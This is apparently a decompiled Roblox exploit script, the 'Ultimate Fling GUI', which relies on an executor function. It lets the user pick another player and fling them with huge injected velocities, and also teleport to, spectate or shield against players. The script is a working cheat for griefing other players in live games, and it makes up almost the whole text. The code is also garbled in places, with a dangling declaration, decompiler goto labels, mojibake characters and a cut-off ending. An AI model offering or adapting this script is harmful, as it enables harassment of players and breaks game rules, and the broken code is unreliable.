local ultimateFlingGui = Instance.new("ScreenGui")
local mainFrame = (Instance.new("Frame"))
local uiCorner = Instance.new("UICorner")
local targetSelect = Instance.new("Frame")
local uiCorner2 = Instance.new("UICorner")
local scrollingFrame = Instance.new("ScrollingFrame")
local uiListLayout = Instance.new("UIListLayout")
local searchBox = Instance.new("TextBox")
local uiCorner3 = Instance.new("UICorner")
local actionFrame = Instance.new("Frame")
local uiCorner4 = Instance.new("UICorner")
local spectate = Instance.new("TextButton")
local uiCorner5 = Instance.new("UICorner")
local fling = Instance.new("TextButton")
local uiCorner6 = Instance.new("UICorner")
local goTo = Instance.new("TextButton")
local uiCorner7 = Instance.new("UICorner")
local antiFling = (Instance.new("TextButton"))
local uiCorner8 = Instance.new("UICorner")
local titleBar = Instance.new("Frame")
local uiCorner9 = Instance.new("UICorner")
local title = (Instance.new("TextLabel"))
local close = (Instance.new("ImageButton"))
local uiCorner10 = Instance.new("UICorner")
local minimize = (Instance.new("ImageButton"))
local uiCorner11 = Instance.new("UICorner")
local titleFix = Instance.new("Frame")
local v1
ultimateFlingGui.Name = "UltimateFlingGui"

do
end

ultimateFlingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ultimateFlingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ultimateFlingGui.ResetOnSpawn = false

mainFrame.Name = "MainFrame"
mainFrame.Parent = ultimateFlingGui
mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
mainFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Position = UDim2.new(0.270759493, 0, 0.289984614, 0)
mainFrame.Size = UDim2.new(0, 276, 0, 339)

uiCorner.CornerRadius = UDim.new(0, 12)
uiCorner.Parent = mainFrame

targetSelect.Name = "TargetSelect"
targetSelect.Parent = mainFrame
targetSelect.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
targetSelect.BorderColor3 = Color3.fromRGB(0, 0, 0)
targetSelect.BorderSizePixel = 0
targetSelect.Position = UDim2.new(0.0326089151, -3, 0.163871646, 31)
targetSelect.Size = UDim2.new(0, 263, 0, 162)

uiCorner2.CornerRadius = UDim.new(0, 12)
uiCorner2.Parent = targetSelect

scrollingFrame.Parent = targetSelect
scrollingFrame.Active = true
scrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scrollingFrame.BackgroundTransparency = 1
scrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
scrollingFrame.BorderSizePixel = 0
scrollingFrame.Position = UDim2.new(0.0310077164, -3, 0.0612244941, -3)
scrollingFrame.Size = UDim2.new(0, 250, 0, 129)
scrollingFrame.ScrollBarThickness = 3

uiListLayout.Parent = scrollingFrame
uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder

searchBox.Name = "SearchBox"
searchBox.Parent = targetSelect
searchBox.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
searchBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
searchBox.BorderSizePixel = 0
searchBox.Position = UDim2.new(0, 0, -0.249853447, -4)
searchBox.Size = UDim2.new(0, 263, 0, 40)
searchBox.Font = Enum.Font.Highway
searchBox.PlaceholderColor3 = Color3.fromRGB(136, 136, 136)
searchBox.PlaceholderText = "Search Player"
searchBox.Text = ""
searchBox.TextColor3 = Color3.fromRGB(255, 255, 255)
searchBox.TextSize = 14

uiCorner3.CornerRadius = UDim.new(0, 12)
uiCorner3.Parent = searchBox

actionFrame.Name = "ActionFrame"
actionFrame.Parent = mainFrame
actionFrame.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
actionFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
actionFrame.BorderSizePixel = 0
actionFrame.Position = UDim2.new(0.0326089151, -3, 0.745391965, 1)
actionFrame.Size = UDim2.new(0, 263, 0, 79)

uiCorner4.CornerRadius = UDim.new(0, 12)
uiCorner4.Parent = actionFrame

spectate.Name = "Spectate"
spectate.Parent = actionFrame
spectate.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
spectate.BorderColor3 = Color3.fromRGB(0, 0, 0)
spectate.BorderSizePixel = 0
spectate.Position = UDim2.new(0.733840287, 4, 0.0782509297, 1)
spectate.Size = UDim2.new(0, 58, 0, 65)
spectate.Font = Enum.Font.Highway
spectate.Text = "Spectate"
spectate.TextColor3 = Color3.fromRGB(255, 255, 255)
spectate.TextSize = 14

uiCorner5.CornerRadius = UDim.new(0, 12)
uiCorner5.Parent = spectate

fling.Name = "Fling"
fling.Parent = actionFrame
fling.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
fling.BorderColor3 = Color3.fromRGB(0, 0, 0)
fling.BorderSizePixel = 0
fling.Position = UDim2.new(0.0380228125, -2, 0.0782509297, 1)
fling.Size = UDim2.new(0, 58, 0, 65)
fling.Font = Enum.Font.Highway
fling.Text = "Fling"
fling.TextColor3 = Color3.fromRGB(255, 255, 255)
fling.TextSize = 14

uiCorner6.CornerRadius = UDim.new(0, 12)
uiCorner6.Parent = fling

goTo.Name = "GoTo"
goTo.Parent = actionFrame
goTo.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
goTo.BorderColor3 = Color3.fromRGB(0, 0, 0)
goTo.BorderSizePixel = 0
goTo.Position = UDim2.new(0.505703449, 1, 0.0782509297, 1)
goTo.Size = UDim2.new(0, 58, 0, 65)
goTo.Font = Enum.Font.Highway
goTo.Text = "GoTo"
goTo.TextColor3 = Color3.fromRGB(255, 255, 255)
goTo.TextSize = 14

uiCorner7.CornerRadius = UDim.new(0, 12)
uiCorner7.Parent = goTo

antiFling.Name = "AntiFling"
antiFling.Parent = actionFrame
antiFling.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
antiFling.BorderColor3 = Color3.fromRGB(0, 0, 0)
antiFling.BorderSizePixel = 0
antiFling.Position = UDim2.new(0.285171092, -4, 0.0782509297, 1)
antiFling.Size = UDim2.new(0, 58, 0, 65)
antiFling.Font = Enum.Font.Highway
antiFling.Text = "AntiFling"
antiFling.TextColor3 = Color3.fromRGB(255, 255, 255)
antiFling.TextSize = 14

uiCorner8.CornerRadius = UDim.new(0, 12)
uiCorner8.Parent = antiFling

titleBar.Name = "TitleBar"
titleBar.Parent = mainFrame
titleBar.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
titleBar.BorderSizePixel = 0
titleBar.Size = UDim2.new(1, 0, 0, 35)
titleBar.ZIndex = 11

uiCorner9.CornerRadius = UDim.new(0, 12)
uiCorner9.Parent = titleBar

title.Name = "Title"
title.Parent = titleBar
title.BackgroundTransparency = 1
title.Position = UDim2.new(0, 11, 0, 9)
title.Size = UDim2.new(-0.260714322, 150, 0.457141131, 0)
title.ZIndex = 12
title.Font = Enum.Font.GothamBold
title.Text = "Ultimate Fling GUI"
title.TextColor3 = Color3.fromRGB(240, 240, 245)
title.TextSize = 15
title.TextXAlignment = Enum.TextXAlignment.Left

close.Name = "close"
close.Parent = titleBar
close.BackgroundColor3 = Color3.fromRGB(165, 43, 45)
close.BackgroundTransparency = 1
close.Position = UDim2.new(0.884615362, 2, 0.166666672, 1)
close.Size = UDim2.new(0, 23, 0, 23)
close.ZIndex = 12
close.Image = "rbxassetid://3926305904"
close.ImageRectOffset = Vector2.new(284, 4)
close.ImageRectSize = Vector2.new(24, 24)

uiCorner10.CornerRadius = UDim.new(0, 10)
uiCorner10.Parent = close

minimize.Name = "Minimize"
minimize.Parent = titleBar
minimize.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
minimize.BackgroundTransparency = 1
minimize.BorderSizePixel = 0
minimize.LayoutOrder = 6
minimize.Position = UDim2.new(0.778388262, 1, 0.166666672, 1)
minimize.Size = UDim2.new(0, 23, 0, 23)
minimize.ZIndex = 12
minimize.Image = "rbxassetid://3926307971"
minimize.ImageRectOffset = Vector2.new(884, 284)
minimize.ImageRectSize = Vector2.new(36, 36)

uiCorner11.CornerRadius = UDim.new(0, 10)
uiCorner11.Parent = minimize

titleFix.Name = "TitleFix"
titleFix.Parent = titleBar
titleFix.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
titleFix.BorderSizePixel = 0
titleFix.Position = UDim2.new(0, 0, 1, -18)
titleFix.Size = UDim2.new(1, 0, 0, 18)
titleFix.ZIndex = 11

do
end

;(coroutine.wrap(function()
  local instance = Instance.new("LocalScript", mainFrame)
  local v2 = game

  do
  end

  local v3 = v2.GetService(v2, "UserInputService")
  local parent = instance.Parent
  local v4, v5, v6, position, position2

  local function f1(p1)
    local v7 = p1.Position - position

    parent.Position = UDim2.new(
      position2.X.Scale, position2.X.Offset + v7.X, position2.Y.Scale, position2.Y.Offset + v7.Y
    )

    return
  end

  do
  end

  local v8

  parent.InputBegan:Connect(function(input)
    local v9 = input

    do
    end

    local v10 = input.UserInputType == Enum.UserInputType.MouseButton1
      or input.UserInputType == Enum.UserInputType.Touch

    local v11

    if v10 then
      v8 = true
      position = input.Position
      position2 = parent.Position

      do
      end

      input.Changed:Connect(function()
        if input.UserInputState == Enum.UserInputState.End then
          v8 = false
        end

        return
      end)
    end

    return
  end)

  do
  end

  local v12

  parent.InputChanged:Connect(function(input2)
    local v13 = input2

    do
    end

    do
    end

    if input2.UserInputType == Enum.UserInputType.MouseMovement
      or input2.UserInputType == Enum.UserInputType.Touch then
      v12 = input2
    end

    return
  end)

  do
  end

  v3.InputChanged:Connect(function(input3)
    local v14 = input3

    do
    end

    do
    end

    if input3 == v12 and v8 then
      f1(input3)
    end

    return
  end)

  return
end))()

do
end

;(coroutine.wrap(function()
  local parent2 = (Instance.new("LocalScript", mainFrame)).Parent

  local uiStroke = Instance.new("UIStroke")
  uiStroke.Color = Color3.fromRGB(255, 82, 85)
  uiStroke.Thickness = 1.5
  uiStroke.Transparency = 0
  uiStroke.Parent = parent2

  local uiStroke2 = Instance.new("UIStroke")
  uiStroke2.Color = Color3.fromRGB(45, 45, 45)
  uiStroke2.Thickness = 7
  uiStroke2.Transparency = 0.6
  uiStroke2.Parent = parent2

  return
end))()

do
end

;(coroutine.wrap(function()
  local instance2 = Instance.new("LocalScript", mainFrame)
  local v15 = game

  do
  end

  local v16 = v15.GetService(v15, "UserInputService")
  local parent3 = instance2.Parent
  local visible = parent3.Visible

  do
  end

  v16.InputBegan:Connect(function(input4, p2)
    local v17 = input4

    if p2 then
      return
    else
      if input4.KeyCode == Enum.KeyCode.K then
        visible = not visible
        parent3.Visible = visible
      end

      return
    end
  end)

  return
end))()

do
end

;(coroutine.wrap(function()
  do
  end

  local new = Instance.new
  local v18 = mainFrame
  local v19 = new("LocalScript", mainFrame)

  do
  end

  local starterGui = game:GetService("StarterGui")
  local v20, v21, v22, v23, v24, v25, v26, v27, v28, v29

  starterGui:SetCore("SendNotification", {
    Title = "UFGUI",
    Text = "ð´ Made by sypcer & Kokospablo",
    Duration = 5,
  })

  starterGui:SetCore("SendNotification", {
    Title = "UFGUI",
    Text = "ð´ Press K to toggle",
    Duration = 5,
  })

  do
  end

  local players = (game:GetService("Players"))

  do
  end

  local runService = (game:GetService("RunService"))
  local localPlayer = players.LocalPlayer
  local parent4 = v19.Parent
  local actionFrame2 = parent4:WaitForChild("ActionFrame")
  local fling2 = actionFrame2:WaitForChild("Fling")
  local goTo2 = actionFrame2:WaitForChild("GoTo")
  local spectate2 = actionFrame2:WaitForChild("Spectate")
  local targetSelect2 = parent4:WaitForChild("TargetSelect")
  local scrollingFrame2 = (targetSelect2:WaitForChild("ScrollingFrame"))
  local searchBox2 = (targetSelect2:FindFirstChild("SearchBox"))

  scrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, 0)
  scrollingFrame2.AutomaticCanvasSize = Enum.AutomaticSize.Y
  scrollingFrame2.ScrollBarThickness = 3

  local function f2(p3, p4, p5)
    local v30 = p3
    local v31 = p4
    local v32 = p5

    pcall(function()
      do
      end

      local starterGui2 = game:GetService("StarterGui")
      starterGui2:SetCore("SendNotification", { Title = p3, Text = p4, Duration = p5 })

      return
    end)

    return
  end

  local function f3(p6, p7)
    local v33 = p7
    local v34 = p6

    do
    end

    local v35 = not p7 or p7 == ""
    local v36

    if v35 then
      return true
    else
      do
      end

      local name
      name = p6.Name or ""

      local v37
      v37 = name

      return (string.find((string.lower(name)), (string.lower(p7)), 1, true)) ~= nil
    end
  end

  local v38, v39

  local function f4()
    local v40 = scrollingFrame2
    local v41, v42, v43, v44, v45, v46, v47, v48, v49, v50, v51, v52

    for index, value in ipairs(scrollingFrame2:GetChildren()) do
      do
      end

      do
      end

      if (value:IsA("Frame")) and value.Name ~= "UIListLayout" then
        value:Destroy()
      end
    end

    local v53 = searchBox2
    local text = ""

    do
    end

    if searchBox2 and (typeof(searchBox2.Text)) == "string" then
      text = searchBox2.Text
    end

    local v54 = players

    for index2, value2 in ipairs(players:GetPlayers()) do
      local v55 = value2

      do
      end

      do
      end

      if v55 ~= localPlayer and f3(v55, text) then
        local frame
        frame = Instance.new("Frame")
        frame.Size = UDim2.new(1, 0, 0, 35)
        frame.BackgroundTransparency = 1
        frame.Parent = scrollingFrame2

        local imageLabel = (Instance.new("ImageLabel"))
        imageLabel.Size = UDim2.new(0, 30, 0, 30)
        imageLabel.Position = UDim2.new(0, 2, 0.5, -15)
        imageLabel.BackgroundTransparency = 1

        pcall(function()
          local v56 = players

          imageLabel.Image = players:GetUserThumbnailAsync(
            v55.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48
          )

          return
        end)

        imageLabel.Parent = frame
        ;(Instance.new("UICorner", imageLabel)).CornerRadius = UDim.new(1, 0)

        local textButton = (Instance.new("TextButton"))
        textButton.Size = UDim2.new(1, -38, 1, -4)
        textButton.Position = UDim2.new(0, 35, 0, 2)
        textButton.BackgroundTransparency = 1
        textButton.Text = v55.Name
        textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        textButton.Font = Enum.Font.GothamBold
        textButton.TextSize = 12
        textButton.Parent = frame

        ;(Instance.new("UICorner", textButton)).CornerRadius = UDim.new(0, 7)

        do
        end

        do
        end

        if v38 and v55 == v38 then
          v39 = textButton
          textButton.BackgroundTransparency = 0.3
          textButton.BackgroundColor3 = Color3.fromRGB(75, 17, 18)
        end

        do
        end

        textButton.MouseButton1Click:Connect(function()
          do
          end

          do
          end

          if v39 and v39.Parent then
            v39.BackgroundTransparency = 1
          end

          v38 = v55
          v39 = textButton

          textButton.BackgroundTransparency = 0.3
          textButton.BackgroundColor3 = Color3.fromRGB(75, 17, 18)

          f2("Selected", v55.Name, 2)
          return
        end)
      end
    end

    if v38 then
      local v57
      v57 = players

      if not (players:FindFirstChild(v38.Name)) then
        v38 = nil
        v39 = nil
      else
        do
        end

        do
        end

        if text ~= "" and not (f3(v38, text)) then
          do
          end

          do
          end

          if v39 and v39.Parent then
            v39.BackgroundTransparency = 1
          end

          v39 = nil
        end
      end
    end

    return
  end

  local v58 = false

  local function f5(p8)
    local v59 = p8

    if v58 then
      return
    else
      v58 = true

      task.delay(p8 or 0.08, function()
        f4()
        v58 = false
        return
      end)

      return
    end
  end

  if searchBox2 then
    local v60
    v60 = searchBox2

    do
    end

    ;(searchBox2:GetPropertyChangedSignal("Text")):Connect(function()
      f5(0.08)
      return
    end)

    do
    end

    searchBox2.Focused:Connect(function()
      f5(0.08)
      return
    end)

    do
    end

    searchBox2.FocusLost:Connect(function()
      f5(0.08)
      return
    end)
  end

  f4()

  do
  end

  players.PlayerAdded:Connect(function()
    f5(0.05)
    return
  end)

  do
  end

  players.PlayerRemoving:Connect(function(player)
    local v61 = v38
    local v62 = player

    do
    end

    if v61 and player == v38 then
      v38 = nil
      v39 = nil
    end

    f5(0.05)
    return
  end)

  local function f6(p9)
    local v63 = p9
    local character = localPlayer.Character
    local v64 = character
    local humanoid = character
    local v65, v66, v67, v68, v69, v70, v71, v72, v73, v74, v75, v76, v77, v78, v79, v80

    if character then
      local v81
      v81 = character
      humanoid = character:FindFirstChildOfClass("Humanoid")
    end

    local v82 = humanoid
    local v83 = v82
    local rootPart = v82 and v82.RootPart
    local v84 = rootPart
    local v85 = p9
    local character2 = p9 and p9.Character
    local v86 = character2
    local v87 = character2

    do
    end

    local humanoid2

    if character2 and character2:FindFirstChildOfClass("Humanoid") then
      humanoid2 = (character2:FindFirstChildOfClass("Humanoid"))
    end

    do
    end

    do
    end

    local rootPart2

    if humanoid2 and humanoid2.RootPart then
      rootPart2 = humanoid2.RootPart
    end

    local v88 = character2

    do
    end

    local head

    if character2 and character2:FindFirstChild("Head") then
      head = character2.Head
    end

    local v89 = character2

    do
    end

    local accessory

    if character2 and character2:FindFirstChildOfClass("Accessory") then
      accessory = character2:FindFirstChildOfClass("Accessory")
    end

    local v90 = accessory

    do
    end

    local handle

    if accessory and accessory:FindFirstChild("Handle") then
      handle = accessory.Handle
    end

    local v91 = character
    local v92 = character

    if character then
      local v93
      v93 = v82

      do
      end

      v92 = v82 and rootPart
    end

    local v94, magnitude, f7

    if v92 then
      if rootPart.Velocity.Magnitude < 50 then
        (getgenv()).OldPos = rootPart.CFrame
      end

      do
      end

      do
      end

      if humanoid2 and humanoid2.Sit then
        return f2("Error Occurred", "Target is sitting", 5)
      else
        if head then
          workspace.CurrentCamera.CameraSubject = head
        else
          do
          end

          do
          end

          if not head and handle then
            workspace.CurrentCamera.CameraSubject = handle
          else
            do
            end

            do
            end

            if humanoid2 and rootPart2 then
              workspace.CurrentCamera.CameraSubject = humanoid2
            end
          end
        end

        local v95
        v95 = character2

        do
        end

        if not (character2 and character2:FindFirstChildWhichIsA("BasePart")) then
          return
        else
          function f7(p10, p11, p12)
            local v96 = p10
            local v97 = p12
            local v98 = p11
            rootPart.CFrame = (CFrame.new(p10.Position)) * p11 * p12
            local v99 = character
            character:SetPrimaryPartCFrame((CFrame.new(p10.Position)) * p11 * p12)

            rootPart.Velocity = Vector3.new(9000000000, 900000000000, 9000000000)
            rootPart.RotVelocity = Vector3.new(9000000000, 9000000000, 9000000000)

            return
          end

          local 

          local function f8(p13)
            local v100 = p13
            local v101 = tick()
            local total = 0
            local v102, v103, v104, v105, v106, v107, v108, v109, v110, v111, v112

            if not (p13.Velocity.Magnitude > 300) then
              do
              end

              if not (p13.Parent ~= p9.Character) then
                do
                end

                if not (p9.Parent ~= players) then
                  do
                  end

                  do
                  end

                  if not (humanoid2 and humanoid2.Sit) then
                    local v113
                    v113 = v82

                    local health
                    health = v82

                    if v82 then
                      do
                      end

                      do
                      end

                      health = v82.Health and v82.Health <= 0
                    end

                    local v114
                    v114 = health or (tick()) > v101 + 2
                  end
                end
              end
            end

            local v115

            repeat
              local v116
              v116 = rootPart

              do
              end

              if rootPart and humanoid2 then
                if p13.Velocity.Magnitude < 50 then
                  total = total + 150

                  f7(p13, (CFrame.new(0, 1.5, 0))
                    + humanoid2.MoveDirection * p13.Velocity.Magnitude / 1.25, CFrame.Angles((math.rad(total)), 0, 0))

                  task.wait()

                  f7(p13, (CFrame.new(0, -1.5, 0))
                    + humanoid2.MoveDirection * p13.Velocity.Magnitude / 1.25, CFrame.Angles((math.rad(total)), 0, 0))

                  task.wait()

                  f7(p13, (CFrame.new(3.5, 2.5, -3.5))
                    + humanoid2.MoveDirection * p13.Velocity.Magnitude / 1.25, CFrame.Angles((math.rad(total)), 0, 0))

                  task.wait()

                  f7(p13, (CFrame.new(-3.5, -2.5, 3.5))
                    + humanoid2.MoveDirection * p13.Velocity.Magnitude / 1.25, CFrame.Angles((math.rad(total)), 0, 0))

                  task.wait()

                  f7(
                    p13, (CFrame.new(0, 2, 0)) + humanoid2.MoveDirection * 2,
                    CFrame.Angles((math.rad(total)), 0, 0)
                  )

                  task.wait()

                  f7(
                    p13, (CFrame.new(0, -2, 0)) + humanoid2.MoveDirection * 2,
                    CFrame.Angles((math.rad(total)), 0, 0)
                  )

                  task.wait()
                else
                  f7(
                    p13, (CFrame.new(0, 2, humanoid2.WalkSpeed * 2)),
                    CFrame.Angles((math.rad(90)), 0, 0)
                  )

                  task.wait()
                  f7(p13, (CFrame.new(0, -2, -humanoid2.WalkSpeed * 2)), CFrame.Angles(0, 0, 0))
                  task.wait()

                  f7(
                    p13, (CFrame.new(0, 2, humanoid2.WalkSpeed * 2)),
                    CFrame.Angles((math.rad(90)), 0, 0)
                  )

                  task.wait()

                  f7(
                    p13, (CFrame.new(0, 2, rootPart2.Velocity.Magnitude / 1)),
                    CFrame.Angles((math.rad(90)), 0, 0)
                  )

                  task.wait()

                  f7(
                    p13, (CFrame.new(0, -2, -rootPart2.Velocity.Magnitude / 1)),
                    CFrame.Angles(0, 0, 0)
                  )

                  task.wait()

                  f7(
                    p13, (CFrame.new(0, 2, rootPart2.Velocity.Magnitude / 1)),
                    CFrame.Angles((math.rad(90)), 0, 0)
                  )

                  task.wait()
                  f7(p13, (CFrame.new(0, -2, 0)), CFrame.Angles((math.rad(90)), 0, 0))
                  task.wait()
                  f7(p13, (CFrame.new(0, -2, 0)), CFrame.Angles(0, 0, 0))
                  task.wait()
                  f7(p13, (CFrame.new(0, -2, 0)), CFrame.Angles((math.rad(-90)), 0, 0))
                  task.wait()
                  f7(p13, (CFrame.new(0, -2, 0)), CFrame.Angles(0, 0, 0))
                  task.wait()
                end

                local v117
                v117 = p13.Velocity.Magnitude > 300

                v115 = v117

                if not v117 then
                  local v118
                  v118 = p13.Parent ~= p9.Character

                  local v119
                  v119 = v118

                  if not v118 then
                    local v120
                    v120 = p9.Parent ~= players

                    local v121
                    v121 = v120

                    if not v120 then
                      do
                      end

                      local sit
                      sit = humanoid2 and humanoid2.Sit

                      local v122
                      v122 = sit

                      if not sit then
                        local v123
                        v123 = v82

                        local health2
                        health2 = v82

                        if v82 then
                          do
                          end

                          do
                          end

                          health2 = v82.Health and v82.Health <= 0
                        end

                        do
                        end

                        v122 = health2 or (tick()) > v101 + 2
                      end

                      v121 = v122
                    end

                    v119 = v121
                  end

                  v115 = v119
                end
              else
                break
              end
            until v115

            return
          end

          workspace.FallenPartsDestroyHeight = (0 / 0)

          local epixVel
          epixVel = Instance.new("BodyVelocity")
          epixVel.Name = "EpixVel"
          epixVel.Parent = rootPart
          epixVel.Velocity = Vector3.new(9000000000, 9000000000, 9000000000)
          epixVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)

          local v124
          v124 = v82

          v82:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

          do
          end

          do
          end

          if rootPart2 and head then
            if (rootPart2.CFrame.p - head.CFrame.p).Magnitude > 5 then
              f8(head)
            else
              f8(rootPart2)
            end

            ::L1895932::
            epixVel:Destroy()
            v94 = v82
            v82:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
            task.wait(1)
            workspace.CurrentCamera.CameraSubject = v82
            magnitude = (rootPart.Position - (getgenv()).OldPos.p).Magnitude

            repeat
              rootPart.CFrame = (getgenv()).OldPos * (CFrame.new(0, 0.5, 0))

              local v125
              v125 = character

              character:SetPrimaryPartCFrame((getgenv()).OldPos * (CFrame.new(0, 0.5, 0)))

              local v126
              v126 = v82

              v82:ChangeState("GettingUp")

              local v127
              v127 = character

              for key, value3 in pairs(character:GetChildren()) do
                if (value3:IsA("BasePart")) then
                  value3.Velocity = Vector3.new()
                  value3.RotVelocity = Vector3.new()
                end
              end

              task.wait()
            until (rootPart.Position - (getgenv()).OldPos.p).Magnitude < 25

            workspace.FallenPartsDestroyHeight = (getgenv()).FPDH
            return
          else
            do
            end

            do
            end

            if rootPart2 and not head then
              f8(rootPart2)
              goto L1895932
            else
              do
              end

              do
              end

              if not rootPart2 and head then
                f8(head)
                goto L1895932
              else
                local v128
                v128 = not rootPart2

                local v129
                v129 = v128

                if v128 then
                  local v130
                  v130 = not head

                  local v131
                  v131 = v130

                  if v130 then
                    do
                    end

                    v131 = accessory and handle
                  end

                  v129 = v131
                end

                if v129 then
                  f8(handle)
                  goto L1895932
                else
                  return f2("Error Occurred", "Target is missing everything", 5)
                end
              end
            end
          end
        end
      end
    else
      return f2("Error Occurred", "Random error", 5)
    end
  end

  local v132 = false

  do
  end

  fling2.MouseButton1Click:Connect(function()
    if v38 then
      f6(v38)
    else
    end

    return
  end)

  do
  end

  goTo2.MouseButton1Click:Connect(function()
    do
    end

    local v133 = not v38 or not v38.Character
    local v134, v135, v136

    if v133 then
      return f2("Error", "Select a player first!", 3)
    else
      do
      end

      local humanoidRootPart
      humanoidRootPart = v38.Character:FindFirstChild("HumanoidRootPart")

      local character3
      character3 = localPlayer.Character

      local humanoidRootPart2
      humanoidRootPart2 = character3

      if character3 then
        do
        end

        humanoidRootPart2 = localPlayer.Character:FindFirstChild("HumanoidRootPart")
      end

      local v137
      v137 = not humanoidRootPart

      local v138
      v138 = humanoidRootPart2

      do
      end

      if v137 or not v138 then
        return
      else
        v138.CFrame = humanoidRootPart.CFrame * (CFrame.new(0, 0, 3))
        f2("Teleported", "To " .. v38.Name, 3)
        return
      end
    end
  end)

  do
  end

  local connect

  spectate2.MouseButton1Click:Connect(function()
    do
    end

    local v139 = not v38 or not v38.Character
    local v140, v141, v142, v143, v144, v145

    if v139 then
      return f2("Error", "Select a player first!", 3)
    else
      v132 = not v132

      if v132 then
        f2("Spectate", "Enabled: " .. v38.Name, 3)

        do
        end

        local humanoidRootPart3
        humanoidRootPart3 = v38.Character:FindFirstChild("HumanoidRootPart")

        local currentCamera
        currentCamera = workspace.CurrentCamera

        local humanoid3
        humanoid3 = humanoidRootPart3

        if not humanoidRootPart3 then
          do
          end

          humanoid3 = v38.Character:FindFirstChildOfClass("Humanoid")
        end

        currentCamera.CameraSubject = humanoid3

        if connect then
          do
          end

          connect:Disconnect()
        end

        do
        end

        connect = (runService.RenderStepped:Connect(function()
          do
          end

          local character4 = v38 and v38.Character
          local v146, v147, v148, v149

          if character4 then
            do
            end

            local humanoidRootPart4
            humanoidRootPart4 = v38.Character:FindFirstChild("HumanoidRootPart")

            local currentCamera2
            currentCamera2 = workspace.CurrentCamera

            local humanoid4
            humanoid4 = humanoidRootPart4

            if not humanoidRootPart4 then
              do
              end

              humanoid4 = v38.Character:FindFirstChildOfClass("Humanoid")
            end

            currentCamera2.CameraSubject = humanoid4
          else
            v132 = false

            if connect then
              do
              end

              connect:Disconnect()
            end

            local character5
            character5 = localPlayer.Character

            local humanoid5
            humanoid5 = character5

            if character5 then
              do
              end

              humanoid5 = localPlayer.Character:FindFirstChildOfClass("Humanoid")
            end

            local v150
            v150 = humanoid5

            if v150 then
              workspace.CurrentCamera.CameraSubject = v150
            end
          end

          return
        end))
      else
        if connect then
          do
          end

          connect:Disconnect()
        end

        local character6
        character6 = localPlayer.Character

        local humanoid6
        humanoid6 = character6

        if character6 then
          do
          end

          humanoid6 = localPlayer.Character:FindFirstChildOfClass("Humanoid")
        end

        local v151
        v151 = humanoid6

        if v151 then
          workspace.CurrentCamera.CameraSubject = v151
        end
      end

      return
    end
  end)

  return
end))()

do
end

;(coroutine.wrap(function()
  local parent5 = (Instance.new("LocalScript", antiFling)).Parent

  do
  end

  local starterGui3 = (game:GetService("StarterGui"))

  do
  end

  local localPlayer2 = (game:GetService("Players")).LocalPlayer
  local character7 = localPlayer2.Character
  local wait = character7
  local v152, v153

  if not character7 then
    do
    end

    wait = localPlayer2.CharacterAdded:Wait()
  end

  local v154 = wait
  local v155 = v154
  local humanoid7 = (v154:WaitForChild("Humanoid"))
  local v156 = false
  local v157

  local function f9()
    local v158 = humanoid7
    humanoid7:SetStateEnabled(Enum.HumanoidStateType.Seated, false)

    pcall(function()
      local v159 = starterGui3

      starterGui3:SetCore("SendNotification", {
        Title = "Anti-Fling",
        Text = "Protection Enabled",
        Duration = 3,
      })

      return
    end)

    v157 = (task.spawn(function()
      local v160 = 0
      local v161, v162, v163

      while v156 do
        v160 = v160 + (task.wait(0.01))

        do
        end

        for index3, value4 in ipairs(workspace:GetDescendants()) do
          local basePart
          basePart = value4:IsA("BasePart")

          local v164
          v164 = basePart

          if basePart then
            local v165
            v165 = not value4.Anchored

            local v166
            v166 = v165

            do
            end

            v164 = v165 and not (value4:IsDescendantOf(v154))
          end

          if v164 then
            do
            end

            do
            end

            if value4.AssemblyLinearVelocity.Magnitude > 3
              or value4.AssemblyAngularVelocity.Magnitude > 3 then
              value4.CanCollide = false
            end

            if v160 >= 0.5 then
              if value4.AssemblyLinearVelocity.Magnitude > 50 then
                value4.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
              end

              if value4.AssemblyAngularVelocity.Magnitude > 50 then
                value4.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
              end
            end
          end
        end

        if v160 >= 0.5 then
          v160 = 0
        end
      end

      return
    end))

    return
  end

  local function f10()
    v156 = false

    if v157 then
      task.cancel(v157)
      v157 = nil
    end

    pcall(function()
      local v167 = starterGui3

      starterGui3:SetCore("SendNotification", {
        Title = "Anti-Fling",
        Text = "Protection Disabled",
        Duration = 3,
      })

      return
    end)

    return
  end

  do
  end

  parent5.MouseButton1Click:Connect(function()
    v156 = not v156

    if v156 then
      parent5.TextColor3 = Color3.fromRGB(0, 255, 0)
      f9()
    else
      parent5.TextColor3 = Color3.fromRGB(255, 255, 255)
      f10()
    end

    return
  end)

  return
end))()

do
end

;(coroutine.wrap(function()
  local instance3 = Instance.new("LocalScript", title)

  do
  end

  local tweenService = game:GetService("TweenService")
  local parent6 = instance3.Parent
  local v168

  for index4, value5 in ipairs(parent6:GetChildren()) do
    if (value5:IsA("UIGradient")) then
      value5:Destroy()
    end
  end

  local uiGradient = Instance.new("UIGradient")
  uiGradient.Parent = parent6

  uiGradient.Color = ColorSequence.new({
    (ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 100, 100))),
    (ColorSequenceKeypoint.new(0.45, Color3.fromRGB(180, 180, 180))),
